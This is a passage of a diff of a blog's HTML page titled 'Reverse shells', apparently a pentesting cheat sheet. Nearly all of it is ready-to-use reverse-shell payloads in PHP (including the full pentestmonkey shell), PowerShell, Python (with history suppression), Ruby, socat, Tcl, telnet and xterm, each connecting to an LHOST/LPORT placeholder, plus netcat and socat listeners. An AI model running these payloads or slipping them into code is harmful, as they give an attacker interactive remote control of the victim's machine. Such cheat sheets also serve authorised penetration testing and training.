+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;LHOST&#34;,LPORT);shell_exec(&#34;/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="ni">&amp;3&#34;);</span>&#39;</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;LHOST&#34;,LPORT);`/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="ni">&amp;3`;</span>&#39;</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;LHOST&#34;,LPORT);system(&#34;/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="ni">&amp;3&#34;);</span>&#39;</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;LHOST&#34;,LPORT);popen(&#34;/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="err">&amp;</span>3&#34;, &#34;r&#34;);&#39;</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">// pentestmonkey one-liner ^_^
+<span class="cp">&lt;?php</span> <span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s2">&#34;LHOST&#34;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="nx">LPORT</span><span class="p">;</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s2">&#34;uname -a; w; id; /bin/bash -i&#34;</span><span class="p">;</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s2">&#34;pcntl_fork&#34;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot fork&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Cannot setsid()&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span> <span class="p">}</span> <span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span> <span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">));</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot spawn shell&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+</code></pre></div></p>
 
 <h1 id="powershell">Powershell</h1>
 
-<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;LHOST&#39;</span><span class="p">,</span><span class="n">LPORT</span><span class="p">);</span> <span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span> <span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span> <span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{;</span> <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span> <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="n">iex</span> <span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span> <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span> <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span> <span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;LHOST&#39;</span><span class="p">,</span><span class="n">LPORT</span><span class="p">);</span> <span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span> <span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span> <span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{;</span> <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span> <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="n">iex</span> <span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span> <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span> <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span> <span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span></code></pre></div></p>
 
 <h1 id="python">Python</h1>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># TCP</span>
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();exit();&quot;</span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># TCP</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();exit();&#34;</span></code></pre></div></p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># STCP</span>
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import os,pty,socket,sctp;sctp.sctpsocket_tcp(socket.AF_INET);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();exit();&quot;</span>
-</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># STCP</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import os,pty,socket,sctp;sctp.sctpsocket_tcp(socket.AF_INET);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();exit();&#34;</span></code></pre></div>
 
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># UDP</span>
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();&quot;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># UDP</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((&#39;LHOST&#39;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;);pty.spawn([&#39;/bin/bash&#39;,&#39;-i&#39;]);s.close();&#34;</span></code></pre></div>
 
 <h1 id="ruby">Ruby</h1>
 
-<p><div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;f=TCPSocket.open(&quot;LHOST&quot;,LPORT).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&quot;LHOST&quot;,&quot;LPORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span></span><span class="c1"># Windows</span>
-<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;c=TCPSocket.new(&quot;LHOST&quot;,&quot;LPORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;f=TCPSocket.open(&#34;LHOST&#34;,LPORT).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;LHOST&#34;,&#34;LPORT&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="c1"># Windows</span>
+<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;c=TCPSocket.new(&#34;LHOST&#34;,&#34;LPORT&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span></code></pre></div></p>
 
 <h1 id="socat">Socat</h1>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT</code></pre></div>
 
 <h1 id="tclsh">TCLsh</h1>
 
-<div class="highlight"><pre><code class="language-tcl" data-lang="tcl"><span></span><span class="nv">echo</span> <span class="err">&#39;</span>set s <span class="k">[</span><span class="nb">socket</span> LHOST LPORT<span class="k">];while</span> <span class="mi">42</span> <span class="k">{</span> <span class="nb">puts</span> <span class="o">-</span>nonewline <span class="nv">$s</span> <span class="s2">&quot;shell&gt;&quot;</span><span class="k">;</span><span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span><span class="nb">gets</span> <span class="nv">$s</span> c<span class="k">;set</span> e <span class="s2">&quot;exec $c&quot;</span><span class="k">;if</span> <span class="k">{</span><span class="o">!</span><span class="k">[catch</span> <span class="k">{set</span> r <span class="k">[eval</span> <span class="nv">$e</span><span class="k">]}</span> err<span class="k">]}</span> <span class="k">{</span> <span class="nb">puts</span> <span class="nv">$s</span> <span class="nv">$r</span> <span class="k">};</span> <span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span> <span class="k">};</span> <span class="nb">close</span> <span class="nv">$s</span><span class="k">;</span><span class="err">&#39;</span> <span class="o">|</span> <span class="nv">tclsh</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-tcl" data-lang="tcl"><span class="nv">echo</span> <span class="err">&#39;</span>set s <span class="k">[</span><span class="nb">socket</span> LHOST LPORT<span class="k">];while</span> <span class="mi">42</span> <span class="k">{</span> <span class="nb">puts</span> <span class="o">-</span>nonewline <span class="nv">$s</span> <span class="s2">&#34;shell&gt;&#34;</span><span class="k">;</span><span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span><span class="nb">gets</span> <span class="nv">$s</span> c<span class="k">;set</span> e <span class="s2">&#34;exec $c&#34;</span><span class="k">;if</span> <span class="k">{</span><span class="o">!</span><span class="k">[catch</span> <span class="k">{set</span> r <span class="k">[eval</span> <span class="nv">$e</span><span class="k">]}</span> err<span class="k">]}</span> <span class="k">{</span> <span class="nb">puts</span> <span class="nv">$s</span> <span class="nv">$r</span> <span class="k">};</span> <span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span> <span class="k">};</span> <span class="nb">close</span> <span class="nv">$s</span><span class="k">;</span><span class="err">&#39;</span> <span class="o">|</span> <span class="nv">tclsh</span></code></pre></div>
 
 <h1 id="telnet">Telnet</h1>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>rm -f /tmp/p<span class="p">;</span> mknod /tmp/p p <span class="o">&amp;&amp;</span> telnet LHOST LPORT <span class="m">0</span>/tmp/p
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>telnet LHOST LPORT <span class="p">|</span> /bin/bash <span class="p">|</span> telnet LHOST LPORT
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/p<span class="p">;</span> mknod /tmp/p p <span class="o">&amp;&amp;</span> telnet LHOST LPORT <span class="m">0</span>/tmp/p</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">telnet LHOST LPORT <span class="p">|</span> /bin/bash <span class="p">|</span> telnet LHOST LPORT</code></pre></div></p>
 
 <h1 id="xterm">xterm</h1>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1"># Make sure the Xserver is listening to TCP.</span>
-xhost +RHOST
-xterm -display LHOST:0 or <span class="nv">DISPLAY</span><span class="o">=</span>LHOST:0 xterm
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Make sure the Xserver is listening to TCP.
+</span><span class="c1"></span>xhost +RHOST
+xterm -display LHOST:0 or <span class="nv">DISPLAY</span><span class="o">=</span>LHOST:0 xterm</code></pre></div>
 
 <h1 id="listeners">Listeners</h1>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span><span class="m">0</span>,raw tcp-listen:LPORT
-nc -lvvp LPORT
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span><span class="m">0</span>,raw tcp-listen:LPORT
+nc -lvvp LPORT</code></pre></div>
 
         </div>
 
@@ -469,9 +407,9 @@ nc -lvvp LPORT
             <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2freverse_shells%2f&t=Reverse%20shells" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
             <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2freverse_shells%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
             <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2freverse_shells%2f&text=Reverse%20shells&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
